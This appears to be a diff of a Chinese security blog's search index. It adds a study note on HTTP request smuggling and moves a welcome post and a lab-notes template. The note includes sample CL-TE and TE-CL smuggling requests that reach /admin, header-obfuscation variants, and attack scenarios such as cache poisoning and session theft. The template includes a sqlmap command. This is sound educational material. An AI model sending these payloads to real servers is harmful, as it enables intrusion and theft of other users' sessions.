+POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling
 
-靶场信息
+Transfer-Encoding头
+POST /search HTTP/1.1Host: normal-website.comContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunkedbq=smuggling0
+
+常见的HTTP请求走私类型
+
+CL-TE漏洞：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。
+TE-CL漏洞：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。
+TE-TE漏洞：前端和后端服务器都使用Transfer-Encoding头，但可以通过混淆头来诱导其中一台服务器不处理它。
+
+入口点:HTTP请求走私的攻击入口主要存在于前端代理服务器与后端应用服务器之间的连接链路上，常见的入口场景包括：
+1. 反向代理 &#x2F; 负载均衡器
+Nginx、Apache、HAProxy、F5、Cloudflare 等反向代理或负载均衡设备与后端 Tomcat、Jetty、Node.js 等应用服务器之间
+代理层负责连接复用（keep-alive），将多个前端请求复用到同一条后端 TCP 连接上
+
+2. CDN &#x2F; WAF 后端
+CDN 节点与源站服务器之间
+WAF（Web应用防火墙）仅检查前端可见的请求部分，走私的恶意请求被后端单独解析从而绕过 WAF 检测
+
+3. 支持 HTTP 管道化 &#x2F; 连接复用的网关
+API 网关、微服务网关（如 Kong、Zuul、Spring Cloud Gateway）
+任何将多个 HTTP 请求复用到同一后端 TCP 连接的中间件
+
+4. 常见可利用的页面&#x2F;接口
+登录接口、用户认证页面（可走私出其他用户的会话）
+搜索、评论等反射型输入点（可配合 XSS 扩大危害）
+静态资源缓存节点（可实施缓存投毒）
 
 
-项目
-内容
+利用思路:基本原理回顾
+攻击者构造一个包含两个请求边界的特制请求：前端服务器按一种方式解析（认为是一个请求），后端服务器按另一种方式解析（认为是两个请求），从而将第二个”隐藏请求”走私到后端。
+三类漏洞的利用方式CL-TE 漏洞（前端用CL，后端用TE）
+思路：前端根据 Content-Length 认为请求已结束，将完整请求转发给后端；后端按 Transfer-Encoding: chunked 解析，第一个 chunk 结束后，剩余内容被当作下一个独立请求处理
+利用：在请求体中嵌入第二个请求，后端会单独处理该走私请求
+
+POST / HTTP/1.1Host: target.comContent-Length: 50Transfer-Encoding: chunked0GET /admin HTTP/1.1Host: target.comX: 
+
+TE-CL 漏洞（前端用TE，后端用CL）
+思路：前端按 chunked 解析，读到 0\r\n\r\n 认为请求结束；后端根据 Content-Length 判断请求长度，超出部分被拼接到下一个用户的请求前面
+利用：走私的请求前缀会污染下一个请求，影响其他用户
+
+POST / HTTP/1.1Host: target.comContent-Length: 4Transfer-Encoding: chunked5cGET /admin HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedContent-Length: 15x=10
+
+TE-TE 漏洞（两端都用TE，但可混淆）
+思路：前后端都支持 chunked，但通过混淆 Transfer-Encoding 头（如加空格、大小写变体、重复头、前缀后缀），让其中一台服务器不识别该头，转而使用 Content-Length 或忽略
+常见混淆手法：
+Transfer-Encoding: xchunked（加前缀）
+Transfer-Encoding : chunked（冒号后多空格）
+Transfer-Encoding: chunked, identity（多值）
+重复的 Transfer-Encoding 头
+大小写变体：transfer-encoding、TRANSFER-ENCODING
 
 
 
-靶场名称
-DVWA &#x2F; sqli-labs &#x2F; upload-labs &#x2F; Vulnhub &#x2F; HTB
+进阶利用场景
 
 
-目标地址
-http://xxx
+利用场景
+说明
 
 
-难度
-低 &#x2F; 中 &#x2F; 高
+
+绕过访问控制
+走私请求直接访问被前端&#x2F;WAF拦截的路径（如 &#x2F;admin）
 
 
-授权范围
-本地练习 &#x2F; 官方授权
+缓存投毒
+将恶意响应写入缓存，影响所有访问该缓存的用户
 
 
-环境搭建docker run -d -p 80:80 vulnerables/web-dvwa
+会话劫持
+通过走私请求窃取其他用户的请求头中的 Cookie &#x2F; Token
 
-漏洞点分析描述漏洞成因与触发条件。
-利用过程步骤一：xxxsqlmap -u &quot;http://target/?id=1&quot; --dbs
 
-步骤二：xxx插入截图（图片放在与文章同名的资源文件夹中）：
-&#123;% asset_img 1.png 截图描述 %&#125;
+XSS 升级
+将反射型 XSS 转化为存储型&#x2F;扩散型危害
 
-防御与修复
-过滤输入
-使用参数化查询
-最小权限原则
+
+凭据窃取
+走私请求诱导后端将下一个用户的请求内容返回给攻击者
+
+
+
+代码特点1. 同时存在两种长度标识请求中同时出现 Content-Length 和 Transfer-Encoding 头，且两端服务器对优先级处理不一致：
+
+有的服务器优先使用 Content-Length
+有的服务器优先使用 Transfer-Encoding
+有的服务器在两者共存时报错，有的则静默选择其中一个
+
+2. Transfer-Encoding 解析不严格后端代码对 Transfer-Encoding 头的解析存在宽松匹配问题：
+// 不安全的解析示例：未严格校验头格式if (header.contains(&quot;chunked&quot;)) &#123;    useChunked = true;&#125;// 应使用严格的 equals 或规范化后比较
+
+3. 前后端使用不同的 HTTP 解析库
+前端用 Nginx（C 语言解析），后端用 Tomcat（Java 解析）
+不同语言、不同库对 HTTP 规范的实现细节存在差异
+特别是对模糊边界情况（重复头、空格、大小写）的处理不一致
+
+4. 代理层未正确规范化请求头
+代理服务器在转发请求前，没有移除或规范化歧义的请求头
+安全的代理应在检测到 CL + TE 共存时，优先以 TE 为准并移除 CL，或直接拒绝请求
+
+5. Chunked 编码边界处理缺陷
+对 chunk size 的解析不严格（允许前导零、空白字符）
+对最后一个 chunk（0\r\n\r\n）的尾部处理不完善
+chunk 扩展字段（chunk extensions）处理逻辑存在漏洞
 
 ]]></content>
       <categories>
-        <category>靶场</category>
+        <category>Web安全</category>
       </categories>
       <tags>
-        <tag>模板</tag>
-        <tag>靶场</tag>
+        <tag>HTTP请求走私</tag>
       </tags>
   </entry>
   <entry>
@@ -1508,55 +2960,6 @@ OWASP
       </tags>
   </entry>
   <entry>
-    <title>欢迎来到我的安全博客</title>
-    <url>/2026/08/14/welcome-to-my-blog/</url>
-    <content><![CDATA[博客定位你好，欢迎来到我的安全博客 👋
-这里是我的 网络安全学习笔记，主要用于记录我在 Web 安全、渗透测试、CTF 比赛和靶场练习中的所学所思。
-内容分类
-
-
-分类
-内容
-
-
-
-Web安全
-各类 Web 漏洞的原理、利用与防御
-
-
-渗透测试
-实战渗透流程、工具使用、思路总结
-
-
-CTF
-比赛 Writeup、解题复盘
-
-
-靶场
-DVWA &#x2F; sqli-labs &#x2F; upload-labs &#x2F; Vulnhub &#x2F; HTB 等通关笔记
-
-
-写作规范
-所有文章均遵循「原理 → 复现 → 防御」的结构
-靶场与比赛文章请务必标注目标来源与授权范围
-文章仅供学习交流，请勿用于非法用途
-
-联系我
-GitHub：Echoin-613
-
-
-道阻且长，行则将至。一起加油 💪
-
-]]></content>
-      <categories>
-        <category>学习笔记</category>
-      </categories>
-      <tags>
-        <tag>博客</tag>
-        <tag>说明</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>XSS 跨站脚本攻击</title>
     <url>/2026/08/14/xss/</url>
     <content><![CDATA[1. 一句话本质用户的输入被浏览器当成「代码」执行，而不是「纯文本」显示。本质是打破输入与输出的信任边界，浏览器无法区分恶意与正常脚本。
@@ -1804,6 +3207,107 @@ confirm(1)、prompt(1)、print()
       <tags>
         <tag>XSS</tag>
         <tag>跨站脚本</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>欢迎来到我的安全博客</title>
+    <url>/2026/08/14/welcome-to-my-blog/</url>
+    <content><![CDATA[博客定位你好，欢迎来到我的安全博客 👋
+这里是我的 网络安全学习笔记，主要用于记录我在 Web 安全、渗透测试、CTF 比赛和靶场练习中的所学所思。
+内容分类
+
+
+分类
+内容
+
+
+
+Web安全
+各类 Web 漏洞的原理、利用与防御
+
+
+渗透测试
+实战渗透流程、工具使用、思路总结
+
+
+CTF
+比赛 Writeup、解题复盘
+
+
+靶场
+DVWA &#x2F; sqli-labs &#x2F; upload-labs &#x2F; Vulnhub &#x2F; HTB 等通关笔记
+
+
+写作规范
+所有文章均遵循「原理 → 复现 → 防御」的结构
+靶场与比赛文章请务必标注目标来源与授权范围
+文章仅供学习交流，请勿用于非法用途
+
+联系我
+GitHub：Echoin-613
+
+
+道阻且长，行则将至。一起加油 💪
+
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>博客</tag>
+        <tag>说明</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>靶场笔记写作模板</title>
+    <url>/2026/08/14/lab-notes-template/</url>
+    <content><![CDATA[
+这是一篇示例文章，展示靶场笔记的推荐写法。
+
+靶场信息
+
+
+项目
+内容
+
+
+
+靶场名称
+DVWA &#x2F; sqli-labs &#x2F; upload-labs &#x2F; Vulnhub &#x2F; HTB
+
+
+目标地址
+http://xxx
+
+
+难度
+低 &#x2F; 中 &#x2F; 高
+
+
+授权范围
+本地练习 &#x2F; 官方授权
+
+
+环境搭建docker run -d -p 80:80 vulnerables/web-dvwa
+
+漏洞点分析描述漏洞成因与触发条件。
+利用过程步骤一：xxxsqlmap -u &quot;http://target/?id=1&quot; --dbs
+
+步骤二：xxx插入截图（图片放在与文章同名的资源文件夹中）：
+&#123;% asset_img 1.png 截图描述 %&#125;
+
+防御与修复
+过滤输入
+使用参数化查询
+最小权限原则
+
+]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>模板</tag>
+        <tag>靶场</tag>
       </tags>
   </entry>
 </search>
